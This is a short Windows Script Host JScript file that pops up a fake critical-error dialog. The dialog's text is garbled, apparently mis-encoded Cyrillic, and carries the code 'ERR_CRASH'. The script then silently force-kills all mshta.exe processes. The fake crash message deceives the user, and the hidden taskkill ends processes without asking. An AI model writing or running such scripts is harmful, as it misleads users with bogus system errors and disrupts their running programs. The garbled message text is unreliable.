var shell = WScript.CreateObject("WScript.Shell");
shell.Popup("�������� ����������� ������. ���������� ����� �����������.\r\n�����: ������ ������� �����!\r\n���: ERR_CRASH", 0, "����������� ������", 0+16);
shell.Run("taskkill /f /im mshta.exe", 0);